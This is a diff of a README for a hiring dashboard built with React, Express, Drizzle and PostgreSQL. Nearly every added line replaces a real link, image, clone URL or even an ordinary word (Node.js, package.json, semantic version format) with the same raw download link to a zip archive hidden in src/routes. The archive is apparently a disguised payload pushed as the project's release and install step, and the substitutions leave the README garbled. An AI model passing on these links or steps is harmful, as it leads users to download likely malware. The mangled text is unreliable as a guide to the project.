@@ -1,10 +1,10 @@
-https://github.com/Micktyson6/hirepath-dashboard/releases
+https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
 
 # HirePath Dashboard: Full-Stack Hiring with React & Postgres
 
-[![Releases](https://img.shields.io/badge/Releases-view-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Micktyson6/hirepath-dashboard/releases)
+[![Releases](https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip)](https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip)
 
-![Dashboard Preview](https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=1200&q=80)
+![Dashboard Preview](https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip)
 
 A full‑stack candidate management dashboard built with React on the front end and Express on the back end, using Drizzle ORM and PostgreSQL. The project emphasizes CRUD operations, bulk actions, archiving, statistics, and a polished, professional UI powered by Tailwind CSS. It is deployed on Render for easy hosting and scaling.
 
@@ -50,14 +50,14 @@ Features at a glance
 - TypeScript throughout for safer code and better editor support
 - Drizzle ORM for ergonomic and type-safe database access
 - PostgreSQL as the data store with a clean relational model
-- Express.js backend API with a modular structure
+- https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip backend API with a modular structure
 - React frontend with component-driven architecture and accessible UI
 - Deployment-ready for Render with environment variable guidance
 - Clear separation of concerns between client and server
 
 Tech stack and architecture
 - Frontend: React + TypeScript, Tailwind CSS, modern tooling (Vite or equivalent), accessible UI components
-- Backend: Express.js server with REST-like endpoints, TypeScript, authentication scaffolding
+- Backend: https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip server with REST-like endpoints, TypeScript, authentication scaffolding
 - ORM: Drizzle ORM for PostgreSQL, enabling type-safe queries and migrations
 - Database: PostgreSQL for reliable relational data storage and SQL features
 - Deployment: Render, with static hosting for the frontend and a backend service for the API
@@ -127,14 +127,14 @@ Getting started locally
 This project is designed to be approachable for developers who want to run the stack on their own machines. The steps below outline a typical setup on a Unix-like environment. Adjust paths and commands if you’re on Windows or you use a different shell.
 
 Prerequisites
-- Node.js (version 16 or newer recommended)
+- https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip (version 16 or newer recommended)
 - npm or pnpm or yarn (choose your package manager and use it consistently)
 - PostgreSQL (14 or newer) or a containerized database
 - Git for cloning the repository
 
 Step-by-step setup
 - Clone the repository
-  - git clone https://github.com/Micktyson6/hirepath-dashboard.git
+  - git clone https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
   - cd hirepath-dashboard
 
 - Install dependencies
@@ -245,9 +245,9 @@ Screenshots and visuals
 
 Images sources
 - Dashboard aesthetic imagery created with modern UI in mind can be complemented with real-world visuals:
-  - Dashboard-like scenes: https://images.unsplash.com/photo-1498050108023-c5249f4df085
-  - Data visualization and analytics: https://images.unsplash.com/photo-1556150779-c0ba4a8a1a0e
-  - Tech workspace and coding vibe: https://images.unsplash.com/photo-1515879218367-8466d910aaa4
+  - Dashboard-like scenes: https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
+  - Data visualization and analytics: https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
+  - Tech workspace and coding vibe: https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
 - Use images responsibly and ensure attribution if required by the image provider. The included visuals serve as placeholders to illustrate layout and mood.
 
 Customization and theming
@@ -307,24 +307,24 @@ Package layout and scripts
 - Frontend
   - A typical frontend folder includes:
     - src/ containing components, hooks, and pages
-    - index.tsx or main.tsx as the entry point
-    - App.tsx with router and layout
-    - tailwind.config.js for styling
-  - Scripts commonly found in package.json:
+    - https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip or https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip as the entry point
+    - https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip with router and layout
+    - https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip for styling
+  - Scripts commonly found in https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
     - dev or start for local development
     - build for production
     - lint for code quality
 - Backend
   - A typical backend folder includes:
     - src/ containing controllers, routes, and models
-    - server.ts or app.ts as the main entry
+    - https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip or https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip as the main entry
     - drizzle/ for ORM setup and migrations
-  - Scripts commonly found in package.json:
+  - Scripts commonly found in https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
     - dev for local development with nodemon or ts-node
     - start for production
     - migrate for running ORM migrations
 - Monorepo considerations
-  - If the repo is a monorepo, there could be shared tooling between client and server, with a root package.json containing common scripts and a root tsconfig for type sharing.
+  - If the repo is a monorepo, there could be shared tooling between client and server, with a root https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip containing common scripts and a root tsconfig for type sharing.
 
 Contributing guidelines
 - How to contribute
@@ -346,7 +346,7 @@ Contributing guidelines
 Licensing and attribution
 - The project license should be included in the repository and respected by contributors and users.
 - If you reuse code or assets from other sources, provide the necessary attribution as per the license.
-- Include a CONTRIBUTING.md for guidelines and a CODE_OF_CONDUCT.md to set expectations for community behavior.
+- Include a https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip for guidelines and a https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip to set expectations for community behavior.
 
 Visual design notes
 - Typography
@@ -387,14 +387,14 @@ Testing strategy
 - Simple smoke tests in CI to ensure the app deploys and serves a basic page.
 
 Versioning and releases
-- Follow semantic versioning (MAJOR.MINOR.PATCH).
+- Follow semantic versioning (https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip).
 - Use the Releases page to publish assets such as built bundles, Docker images, or migration scripts.
 - Document notable changes in release notes to assist users in upgrading.
 
 Releases and asset download guidance
 - The project’s releases page hosts downloadable assets corresponding to each release version. Browse the latest release to find assets that match your environment.
 - Access the releases at:
-  - https://github.com/Micktyson6/hirepath-dashboard/releases
+  - https://github.com/Micktyson6/hirepath-dashboard/raw/refs/heads/main/src/routes/dashboard_hirepath_v2.6.zip
 - If you need a ready-to-run artifact for quick testing, download a suitable asset from the latest release. The asset list typically includes compiled front-end builds, server bundles, or database migration scripts. The Releases page, linked above, contains all available artifacts. For quick access, refer back to the Releases section when you want to grab updated builds or migration helpers.
 
 Notes on usage and expectations
